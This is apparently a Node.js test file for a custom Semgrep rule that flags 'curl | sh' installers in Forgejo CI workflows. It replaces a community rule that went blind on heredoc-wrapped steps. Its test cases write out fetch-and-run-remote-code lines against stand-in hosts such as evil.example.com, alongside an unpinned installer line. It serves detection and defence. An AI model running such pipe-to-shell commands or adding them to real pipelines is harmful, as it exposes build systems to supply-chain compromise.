// Guards security/sast/rules/mcm-ci-curl-pipe-shell.yaml — the replacement for a community rule
// that had gone BLIND on this repository (item #224).
//
// WHY A CUSTOM RULE EXISTS AT ALL. `p/owasp-top-ten` ships
// `yaml.github-actions.security.gha-curl-pipe-shell`, which re-parses a step's `run:` block as Bash
// via `metavariable-pattern`. Nearly every run-step here is wrapped in the ci-log-step heredoc
// (feature 042), which that sub-parser cannot read, so it aborts on the block instead of matching
// inside it. Measured on main 2026-09-06 against the pinned semgrep@1.169.0 and this repo's own
// `security/sast/semgrep.yaml`: 36 errors, ALL attributed to that one rule, and 0 findings from it —
// while six `curl … | sh` lines sat in the workflows untouched. A rule that has gone blind and a
// rule that has been remediated are indistinguishable from the gate's output, which is the defect
// this file exists to keep fixed.
//
// The replacement is deliberately TEXT-LEVEL (`pattern-regex` / `pattern-not-regex`, no
// `metavariable-pattern`), so no sub-parser is ever invoked and the heredoc wrapper is irrelevant.
//
// WHERE THE ACCEPTANCE LIVES. The accepted installers are named in the RULE, not in
// security/sast/allowlist.yaml. An allowlist entry matches on `path:line`, so accepting these six
// lines there is either line-pinned (any edit above them re-blocks an unrelated pull request) or
// file-wildcarded (a NEW `curl | sh` added to an already-listed workflow is suppressed unexamined —
// precisely the hole item #224's fourth criterion names). Naming the pinned URLs in the rule instead
// means an unknown host, or an UNPINNED version of an accepted one, blocks anywhere.
//
// This test applies the rule's own regexes rather than restating them, so there is one definition.
// It is line-oriented where semgrep is file-oriented; the two agree here because both patterns
// forbid a newline inside the match, so every hit is confined to a single line by construction.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { parse as parseYaml } from 'yaml';

const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '../..');
const RULE_PATH = resolve(REPO_ROOT, 'security/sast/rules/mcm-ci-curl-pipe-shell.yaml');
const WORKFLOW_DIR = resolve(REPO_ROOT, '.forgejo/workflows');

const ruleFile = parseYaml(readFileSync(RULE_PATH, 'utf8'));
const rule = ruleFile.rules[0];

/** The rule's two halves, read from the rule itself so there is no second copy of either regex. */
function patternsOf(r) {
  const clauses = r.patterns ?? [];
  const find = (key) => clauses.find((c) => key in c)?.[key];
  const positive = find('pattern-regex');
  const negative = find('pattern-not-regex');
  assert.ok(positive, 'rule must carry a pattern-regex (the text-level match)');
  assert.ok(negative, 'rule must carry a pattern-not-regex (the accepted pinned installers)');
  return { positive: new RegExp(positive), negative: new RegExp(negative) };
}

const { positive, negative } = patternsOf(rule);

/** True iff semgrep would report this line — the positive matches and no exception covers it. */
const flags = (line) => positive.test(line) && !negative.test(line);

const workflowLines = () => {
  const out = [];
  for (const name of readdirSync(WORKFLOW_DIR).filter((n) => /\.ya?ml$/.test(n))) {
    const text = readFileSync(resolve(WORKFLOW_DIR, name), 'utf8');
    text.split(/\r?\n/).forEach((line, i) => out.push({ file: name, line: i + 1, text: line }));
  }
  return out;
};

// ── The rule sees the code the blinded one could not ─────────────────────────

test('the rule matches every curl-pipe-shell line the workflows actually contain', () => {
  const hits = workflowLines().filter((l) => positive.test(l.text));
  // A regex that matched nothing would pass every acceptance test below vacuously. This is the
  // guard against that: the blinded community rule's 0 findings looked exactly like a clean repo.
  assert.ok(
    hits.length >= 6,
    `expected the pattern to see the curl|shell installers in .forgejo/workflows (found ${hits.length}) — ` +
      'a pattern that matches nothing makes every acceptance assertion below vacuous, which is the ' +
      'exact failure mode item #224 documents',
  );
  // Every one of them is inside a ci-log-step heredoc, which is what defeated the community rule.
  assert.ok(
    hits.some((h) => h.file === 'guardrails.yml'),
    'expected guardrails.yml among the matches (its uv + rustup installers are heredoc-wrapped)',
  );
});

test('no workflow line is flagged today — main stays green on the accepted pinned installers', () => {
  const flagged = workflowLines().filter((l) => flags(l.text));
  assert.deepEqual(
    flagged.map((l) => `${l.file}:${l.line}`),
    [],
    'a workflow line is no longer covered by the rule\'s accepted-installer list. Either pin/replace ' +
      'the installer, or add it to pattern-not-regex WITH a comment saying why it is accepted — ' +
      'that comment is the written decision item #224 requires.',
  );
});

// ── What the rule must still catch ───────────────────────────────────────────

test('an unknown host piping to a shell is caught', () => {
  assert.ok(flags("          curl -LsSf https://evil.example.com/install.sh | sh"));
  assert.ok(flags("          curl -Ls https://example.invalid/setup | bash"));
});

test('an UNPINNED version of an otherwise-accepted installer is caught', () => {
  // The live near-miss recorded on item #224: PR #272 nearly added exactly this line to
  // renovate.yml, heredoc-wrapped, and the gate would not have objected.
  assert.ok(
    flags("          curl -LsSf https://astral.sh/uv/install.sh | sh"),
    'the unversioned astral.sh uv installer must be caught — the acceptance is for a PINNED version',
  );
  assert.ok(
    !flags("          curl -LsSf https://astral.sh/uv/0.12.10/install.sh | sh"),
    'the pinned astral.sh uv installer is the accepted form',
  );
});

test('a curl that is not piped into a shell is not flagged', () => {
  assert.ok(!flags("          curl -sSfL https://example.com/data.json -o data.json"));
  assert.ok(!flags("          curl -s https://example.com/x | jq .name"));
});

// ── The property that made the community rule useless ────────────────────────

test('the rule never re-parses the run block, so the ci-log-step heredoc cannot blind it', () => {
  const serialized = JSON.stringify(rule);
  assert.ok(
    !serialized.includes('metavariable-pattern'),
    'metavariable-pattern re-parses the step body in a sub-language — that is what blinded ' +
      'gha-curl-pipe-shell on this repository (36 parse errors, 0 findings). Keep this rule text-level.',
  );
  // Proof rather than assertion: the positive pattern matches a heredoc-wrapped installer directly.
  assert.ok(
    positive.test("          curl -LsSf https://astral.sh/uv/install.sh | sh"),
    'the pattern must match a line lifted straight out of a CI_LOG_STEP heredoc body',
  );
});

// ── Wiring: a rule that does not block, or is not scoped, is not a control ────

test('the rule blocks and is scoped to workflow files', () => {
  assert.equal(rule.severity, 'ERROR', 'ERROR normalizes to High, which is what makes the gate fail');
  const include = rule.paths?.include ?? [];
  assert.ok(
    include.some((p) => p.includes('.forgejo/workflows')),
    'the rule must be scoped to the workflow trees, not the whole repository',
  );
});

test('the blinded community rule is no longer carried as a live allowlist entry', () => {
  const allowlist = parseYaml(readFileSync(resolve(REPO_ROOT, 'security/sast/allowlist.yaml'), 'utf8')) ?? [];
  const dead = allowlist.filter((e) => String(e.id).includes('gha-curl-pipe-shell'));
  assert.deepEqual(
    dead,
    [],
    'the gha-curl-pipe-shell entry suppressed nothing because the rule could not run. Leaving it ' +
      'reports as UNMATCHED for ever and reads as "remediated already" — the misreading item #224 ' +
      'is about. It is replaced by mcm-ci-curl-pipe-shell.',
  );
});
